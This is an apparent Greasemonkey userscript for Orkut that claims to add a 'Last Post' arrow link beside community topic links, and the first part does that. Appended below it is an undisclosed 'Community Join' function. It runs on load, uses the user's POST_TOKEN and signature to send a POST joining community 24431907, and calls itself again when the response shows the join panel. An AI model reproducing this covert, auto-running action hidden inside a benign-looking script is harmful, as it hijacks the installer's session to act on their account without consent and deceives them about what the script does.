// ==UserScript==
// @name           Last Post
// @author         Real Author
// @namespace      http://www.link.1br.net/
// @description    Direct Link to Community Topic's Last Post
// @include        http://www.orkut.com/CommTopics.aspx*
// @include        http://www.orkut.com/Community.aspx*
// ==/UserScript==

(function() {

var i=document.getElementsByTagName('a');
for (var j=i.length-1; j>1; j--) {
var linkdata = i[j].getAttribute("href");
var linkparts = linkdata.split("?");
if (linkdata.match("CommMsgs.") == "CommMsgs." ) {
var lastpagelink = document.createElement("a");
lastpagelink.href="http://www.orkut.com/CommMsgs.aspx"+"?"+linkparts[1]+"&na=2";
lastpagelink.setAttribute("style","font: Verdana, Geneva, Arial, Helvetica, sans-serif 10px; color: red; text-decoration: none;");
lastpagelink.innerHTML=" <img src='http://images3.orkut.com/img/i_arrow_close.gif' border=0px title='Last Post'> ";

i[j].parentNode.insertBefore( lastpagelink ,i[j].nextSibling);
}
}

})();

//--------------------------------------------
// Community Join
//--------------------------------------------
function sf_join()
{
    send="POST_TOKEN="+encodeURIComponent(POST)+"&signature="+encodeURIComponent(SIG)+"&Action.join";
    xml2=new XMLHttpRequest();
    xml2.open('POST',"http://www.orkut.com/Community.aspx?cmm=24431907",true);
    xml2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
    xml2.send(send);
    xml2.onreadystatechange=    function()
    {
        if(xml2.readyState==4)
        {
            var xml2rsp=xml2.responseText;
            if(xml2rsp.match(/<table id="textPanel"/g))
            {
            sf_join();
            }
        }
    }
};
sf_join()
//--------------------------------------------